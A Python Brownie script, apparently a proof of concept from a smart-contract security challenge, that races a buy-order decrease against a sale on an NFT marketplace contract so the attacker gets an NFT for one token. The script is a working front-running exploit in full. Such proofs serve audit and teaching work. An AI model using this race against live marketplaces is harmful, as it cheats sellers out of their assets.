from brownie import *
from brownie.network.account import LocalAccount
import threading

def sellToOrderId(deployer):
    NFTMarketplace[-1].sellToOrderId(0, {'from': deployer, 'allow_revert': True})

def decreaseBuyOrder(player, decreaseAmount):
    print("decreaseBuyOrder player: ", player, ' decreaseAmount: ', decreaseAmount)
    NFTMarketplace[-1].decreaseBuyOrder(0, decreaseAmount,  {'from': player , 'gas_price':"10 gwei", 'allow_revert': True})


def attack(deployer, player):
    ercToken = ApeCoin[-1]
    halbornNFT = HalbornNFT[-1]
    marketPlaceToken = NFTMarketplace[-1]

    deployer = deployer[0]
    player = player[0]

    price = 400
    initialBalanceOfplayer = ercToken.balanceOf(player)
    print("players initial balance: " , initialBalanceOfplayer)

    marketPlaceToken.postBuyOrder(0, price, {'from': player})

    t1 = threading.Thread(target=decreaseBuyOrder, args=(player, price-1))
    t2 = threading.Thread(target=sellToOrderId, args=(deployer,))
 
    t1.start()
    t2.start()
 
    t1.join()
    t2.join()
    
    finalBalanceOfplayer = ercToken.balanceOf(player)
    print("players final balance: " , finalBalanceOfplayer)

    nftOwner = halbornNFT.ownerOf(0)

    assert finalBalanceOfplayer == initialBalanceOfplayer - 1
    assert nftOwner == player.address
    print("\t\tassert finalBalanceOfplayer == initialBalanceOfplayer - 1 passed!")
    print("\t\tassert nftOwner == self.player.address passed!")
    print("frontRunningVulnerability exploited successfuly! \n\n")
